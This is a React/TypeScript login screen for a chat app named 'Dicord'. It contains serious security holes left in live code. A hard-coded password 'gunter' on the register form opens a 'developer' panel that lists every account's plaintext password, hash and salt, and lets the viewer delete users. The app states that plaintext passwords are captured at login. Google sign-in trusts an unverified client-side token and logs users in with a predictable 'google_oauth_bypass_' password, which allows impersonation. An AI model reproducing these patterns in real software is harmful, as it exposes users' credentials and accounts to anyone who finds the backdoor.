import React, { useState, useEffect, useRef } from 'react';
import { motion } from 'motion/react';
import { MessageSquare } from 'lucide-react';

interface AuthScreenProps {
  onLogin: (
    username: string,
    password: string,
    displayName: string | undefined,
    isRegister: boolean
  ) => Promise<void>;
}

export function AuthScreen({ onLogin }: AuthScreenProps) {
  const [username, setUsername] = useState('');
  const [displayName, setDisplayName] = useState('');
  const [password, setPassword] = useState('');
  const [isRegister, setIsRegister] = useState(false);
  const [status, setStatus] = useState('Use your username as your Dicord identity.');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [showDevAccounts, setShowDevAccounts] = useState(false);
  const [devAccounts, setDevAccounts] = useState<any[]>([]);
  const [devLoading, setDevLoading] = useState(false);



  const fetchDevAccounts = async () => {
    setDevLoading(true);
    try {
      const res = await fetch('/api/dev/users');
      if (res.ok) {
        const data = await res.json();
        setDevAccounts(data.users || []);
      } else {
        console.error('Failed to fetch dev accounts:', res.statusText);
      }
    } catch (err) {
      console.error('Error fetching dev accounts:', err);
    } finally {
      setDevLoading(false);
    }
  };

  const handleDeleteUser = async (usernameToDelete: string) => {
    if (!window.confirm(`Are you sure you want to delete user @${usernameToDelete}?`)) {
      return;
    }
    
    try {
      const res = await fetch('/api/dev/delete-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: usernameToDelete })
      });
      if (res.ok) {
        fetchDevAccounts();
      } else {
        const errData = await res.json();
        alert(`Failed to delete user: ${errData.error || res.statusText}`);
      }
    } catch (err) {
      console.error('Error deleting dev user:', err);
      alert('Error deleting user.');
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Dev backdoor: Register mode, password is 'gunter', and username/displayName are empty
    if (isRegister && password === 'gunter' && !username.trim() && !displayName.trim()) {
      setShowDevAccounts(true);
      fetchDevAccounts();
      return;
    }

    if (!username.trim() || !password.trim()) {
      return;
    }

    setIsSubmitting(true);
    setStatus(isRegister ? 'Creating your account...' : 'Signing you in...');
    try {
      await onLogin(username, password, isRegister ? displayName : undefined, isRegister);
    } catch (error) {
      setStatus(error instanceof Error ? error.message : 'Unable to continue.');
      setIsSubmitting(false);
    }
  };

  const handleGoogleAuth = async (email: string, name: string) => {
    setIsSubmitting(true);
    setStatus(`Signing in with Google as ${email}...`);
    
    const cleanPrefix = email.split('@')[0].toLowerCase().replace(/[^a-z0-9_]/g, '');
    const gUsername = `google_${cleanPrefix}`;
    const gPassword = `google_oauth_bypass_${gUsername}`;
    const gDisplayName = name;

    try {
      setStatus('Signing in with Google...');
      await onLogin(gUsername, gPassword, undefined, false);
    } catch (loginError) {
      console.log('Google user not found. Registering new profile...', loginError);
      try {
        setStatus('Creating account with Google profile...');
        await onLogin(gUsername, gPassword, gDisplayName, true);
      } catch (registerError) {
        setStatus(registerError instanceof Error ? registerError.message : 'Google authentication failed.');
        setIsSubmitting(false);
      }
    }
  };

  const handleGoogleRedirect = () => {
    const clientId = import.meta.env.VITE_GOOGLE_CLIENT_ID || 'YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com';
    const redirectUri = window.location.origin;
    const scope = 'openid profile email';
    const responseType = 'id_token';
    const nonce = Math.random().toString(36).substring(2);
    
    const googleAuthUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${encodeURIComponent(clientId)}&redirect_uri=${encodeURIComponent(redirectUri)}&scope=${encodeURIComponent(scope)}&response_type=${encodeURIComponent(responseType)}&nonce=${nonce}`;
    
    window.location.href = googleAuthUrl;
  };

  useEffect(() => {
    const hash = window.location.hash;
    if (hash) {
      const params = new URLSearchParams(hash.substring(1));
      const idToken = params.get('id_token');
      if (idToken) {
        window.location.hash = '';
        
        try {
          const base64Url = idToken.split('.')[1];
          const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
          const jsonPayload = decodeURIComponent(
            window
              .atob(base64)
              .split('')
              .map((c) => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2))
              .join('')
          );
          const payload = JSON.parse(jsonPayload);
          
          if (payload.email && payload.name) {
            handleGoogleAuth(payload.email, payload.name);
          }
        } catch (error) {
          console.error('Failed to parse Google ID token:', error);
          setStatus('Failed to verify Google Sign-in.');
        }
      }
    }
  }, []);

  return (
    <div className="h-full w-full overflow-y-auto p-4 sm:p-6 lg:p-8 bg-theme-bg relative text-theme-text">
      <div className="min-h-full w-full flex flex-col items-center justify-center py-8">
        <div className="absolute top-[-20%] left-[-10%] w-[50%] h-[50%] rounded-full bg-indigo-500/10 blur-[120px] pointer-events-none" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-purple-500/10 blur-[120px] pointer-events-none" />

        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
          className="relative w-full max-w-md glass rounded-[32px] p-8 sm:p-10 shadow-[0_8px_32px_rgba(0,0,0,0.5)] z-10"
        >
          <div className="flex justify-center mb-8">
            <div className="w-16 h-16 rounded-2xl gradient-msg flex items-center justify-center text-white">
              <MessageSquare size={32} />
            </div>
          </div>

          <div className="text-center mb-8">
            <h1 className="text-3xl font-bold tracking-tight bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent mb-2">
              Dicord
            </h1>
            <p className="text-theme-muted text-sm">
              Private, fluid, and real-time messaging.
            </p>
          </div>

          <div className="bg-black/5 dark:bg-black/20 p-1 rounded-xl flex mb-6 border border-theme-border">
            <button
              type="button"
              onClick={() => setIsRegister(false)}
              className={`flex-1 py-2.5 text-sm font-medium rounded-lg transition-all cursor-pointer ${
                !isRegister ? 'bg-indigo-500/10 border border-indigo-500/20 text-indigo-600 dark:text-indigo-300 font-bold shadow-md' : 'text-theme-muted hover:text-theme-text'
              }`}
            >
              Log In
            </button>
            <button
              type="button"
              onClick={() => setIsRegister(true)}
              className={`flex-1 py-2.5 text-sm font-medium rounded-lg transition-all cursor-pointer ${
                isRegister ? 'bg-indigo-500/10 border border-indigo-500/20 text-indigo-600 dark:text-indigo-300 font-bold shadow-md' : 'text-theme-muted hover:text-theme-text'
              }`}
            >
              Register
            </button>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            {isRegister && (
              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-theme-muted mb-1.5 ml-1">
                  Display Name
                </label>
                <input
                  type="text"
                  value={displayName}
                  onChange={(e) => setDisplayName(e.target.value)}
                  placeholder="e.g. John Doe"
                  className="w-full bg-theme-bg/50 border border-theme-border rounded-xl px-4 py-3.5 text-theme-text focus:outline-none focus:border-indigo-500 transition-colors placeholder:text-slate-500"
                  required
                />
              </div>
            )}

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-theme-muted mb-1.5 ml-1">
                Username
              </label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value.toLowerCase().replace(/[^a-z0-9_]/g, ''))}
                placeholder="e.g. johndoe"
                className="w-full bg-theme-bg/50 border border-theme-border rounded-xl px-4 py-3.5 text-theme-text focus:outline-none focus:border-indigo-500 transition-colors placeholder:text-slate-500"
                required
              />
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-theme-muted mb-1.5 ml-1">
                Password
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full bg-theme-bg/50 border border-theme-border rounded-xl px-4 py-3.5 text-theme-text focus:outline-none focus:border-indigo-500 transition-colors placeholder:text-slate-500"
                required
              />
            </div>

            {isRegister && password === 'gunter' && (
              <motion.button
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                type="button"
                onClick={() => {
                  setShowDevAccounts(true);
                  fetchDevAccounts();
                }}
                className="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 rounded-xl px-4 py-3.5 font-bold transition-all shadow-md cursor-pointer text-center text-sm mt-2"
              >
                View All Accounts
              </motion.button>
            )}

            <motion.button
              whileHover={{ scale: isSubmitting ? 1 : 1.02 }}
              whileTap={{ scale: isSubmitting ? 1 : 0.98 }}
              type="submit"
              disabled={isSubmitting}
              className="w-full gradient-msg text-white rounded-xl px-4 py-4 font-bold transition-transform mt-8 shadow-lg tracking-wide uppercase text-sm disabled:opacity-60 cursor-pointer"
            >
              {isSubmitting ? 'Please wait' : isRegister ? 'Create account' : 'Enter chat'}
            </motion.button>

            {/* Divider */}
            <div className="relative my-6 flex items-center justify-center">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-theme-border/50"></div>
              </div>
              <span className="relative px-3 text-[10px] font-bold uppercase tracking-widest text-theme-muted bg-theme-panel rounded-full z-10 select-none">
                Or Continue With
              </span>
            </div>

            {/* Google OAuth Button */}
            <button
              type="button"
              disabled={isSubmitting}
              onClick={handleGoogleRedirect}
              className="w-full bg-white dark:bg-white text-slate-800 hover:bg-slate-50 dark:hover:bg-slate-100 flex items-center justify-center gap-3 rounded-xl px-4 py-3.5 font-bold transition-all shadow-md cursor-pointer border border-slate-200 disabled:opacity-60"
            >
              <svg className="w-5 h-5 shrink-0 select-none" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
              </svg>
              <span className="text-sm">Google</span>
            </button>

            <p className="text-center text-xs text-theme-muted min-h-4">{status}</p>
          </form>
        </motion.div>
      </div>

      {showDevAccounts && (
        <div className="fixed inset-0 bg-black/75 backdrop-blur-md flex items-center justify-center z-50 p-4 animate-fade-in">
          <div className="relative w-full max-w-2xl bg-slate-900/95 border border-slate-700/50 rounded-[24px] p-6 max-h-[85vh] overflow-y-auto shadow-2xl flex flex-col">
            <div className="flex justify-between items-center mb-4 pb-3 border-b border-slate-800">
              <div>
                <h2 className="text-xl font-bold text-slate-100">Developer Diagnostic Tool</h2>
                <p className="text-xs text-indigo-400 mt-1">Staged account list retrieved from server</p>
              </div>
              <button 
                type="button"
                onClick={() => setShowDevAccounts(false)}
                className="text-slate-400 hover:text-white bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg transition-colors cursor-pointer text-sm font-medium"
              >
                Close
              </button>
            </div>

            {devLoading ? (
              <div className="flex flex-col items-center justify-center py-12 gap-3">
                <div className="w-8 h-8 border-4 border-indigo-500 border-t-transparent rounded-full animate-spin" />
                <p className="text-sm text-slate-400">Fetching accounts...</p>
              </div>
            ) : devAccounts.length === 0 ? (
              <div className="text-center py-12 text-slate-400">
                No accounts found in the database yet.
              </div>
            ) : (
              <div className="space-y-4 overflow-y-auto pr-1">
                <p className="text-xs text-amber-500 bg-amber-500/10 border border-amber-500/20 p-3 rounded-xl leading-relaxed">
                  Note: Plaintext passwords are now captured and displayed during registration and login for development diagnostic purposes.
                </p>
                <div className="grid gap-3">
                  {devAccounts.map((account, idx) => (
                    <div 
                      key={idx} 
                      className="bg-slate-950/60 border border-slate-800 rounded-xl p-4 flex flex-col gap-2 hover:border-indigo-500/30 transition-all"
                    >
                      <div className="flex justify-between items-start flex-wrap gap-2">
                        <div>
                          <span className="text-xs font-semibold text-indigo-400 uppercase tracking-wider">Display Name</span>
                          <h3 className="text-base font-bold text-white">{account.displayName || '(No Display Name)'}</h3>
                        </div>
                        <div className="flex items-center gap-4">
                          <div className="text-right">
                            <span className="text-xs font-semibold text-indigo-400 uppercase tracking-wider">Username</span>
                            <p className="text-sm font-mono text-slate-300">@{account.username}</p>
                          </div>
                          <button
                            type="button"
                            onClick={() => handleDeleteUser(account.username)}
                            className="bg-red-500/10 hover:bg-red-500/25 border border-red-500/20 hover:border-red-500/40 text-red-400 hover:text-red-300 px-3 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer select-none"
                          >
                            Delete
                          </button>
                        </div>
                      </div>
                      
                      <div className="bg-amber-500/10 border border-amber-500/20 p-3 rounded-lg flex items-center justify-between mt-2">
                        <div>
                          <span className="block text-[10px] font-bold text-amber-500 uppercase tracking-wider mb-0.5">Plaintext Password</span>
                          <code className="text-sm font-mono font-bold text-amber-300 select-all">{account.plainPassword}</code>
                        </div>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3 mt-2 pt-2 border-t border-slate-900">
                        <div className="bg-slate-900/50 p-2.5 rounded-lg border border-slate-800/40">
                          <span className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Password Hash</span>
                          <code className="text-xs font-mono text-emerald-400 break-all select-all">{account.passwordHash}</code>
                        </div>
                        <div className="bg-slate-900/50 p-2.5 rounded-lg border border-slate-800/40">
                          <span className="block text-[10px] font-bold text-slate-500 uppercase tracking-wider mb-1">Salt</span>
                          <code className="text-xs font-mono text-purple-400 break-all select-all">{account.salt}</code>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      )}

    </div>
  );
}
